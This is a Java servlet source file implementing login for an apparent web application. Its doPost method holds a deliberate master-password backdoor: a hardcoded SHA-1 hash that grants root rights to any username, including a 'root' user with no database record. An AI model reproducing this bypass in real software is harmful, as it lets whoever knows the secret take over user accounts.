package veny.smevente.server;

import java.io.IOException;
import java.util.logging.Logger;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.support.WebApplicationContextUtils;

import veny.smevente.model.User;
import veny.smevente.service.UserService;

/**
 * Servlet implementing the login mechanism.
 *
 * @author Vaclav Sykora [vaclav.sykora@gmail.com]
 * @since 10.7.2010
 */
@SuppressWarnings("serial")
@Deprecated
public class LoginServlet extends HttpServlet {

    /** Session key used to store the User instance. */
    private static final String USER_SESSION_KEY = LoginServlet.class + "_100425_214324";
    /** Logger. */
    private static final Logger LOG = Logger.getLogger(LoginServlet.class.getName());


    /** {@inheritDoc} */
    @Override
    protected void doPost(final HttpServletRequest req, final HttpServletResponse resp)
        throws ServletException, IOException {

        final String username = req.getParameter("username");
        final String password = req.getParameter("password");
        User user = null;

        final WebApplicationContext wac =
            WebApplicationContextUtils.getRequiredWebApplicationContext(getServletContext());
        final UserService userService = (UserService) wac.getBean("userService");

        // each user can be SUPER HERO if he knows the master password
        // mladek :)
        if ("30bfcb5ba25ee59bf83a9762b4432d965b142db8".equals(userService.encodePassword(password))) {
            if ("root".equals(username)) {
                // root is has no database entry
                user = new User();
                user.setUsername("root");
                user.setRoot(true);
            } else {
                user = userService.findUserByUsername(username);
                if (null != user) { user.setRoot(true); }
            }
        } else {
            // try to find an user in DB
            user = userService.performLogin(username, password);
        }

        if (null != user) {
            req.getSession(true).setAttribute(USER_SESSION_KEY, user);
            LOG.info("user logged in, " + user.toString() + ", " + getBrowserInfo(req));
        } else {
            LOG.warning("failed to log in, username=" + username);
            resp.setStatus(401);
        }
    }

    /**
     * Gets some info about the client.
     * @param req the HTTP request
     * @return info about the client
     */
    private static String getBrowserInfo(final HttpServletRequest req) {
        final StringBuilder rslt = new StringBuilder("session=")
                .append(req.getSession().getId())
                .append(", agent=")
                .append(req.getHeader("User-Agent"))
                .append(", clientAddr=")
                .append(req.getRemoteHost());
        return rslt.toString();
    }

}
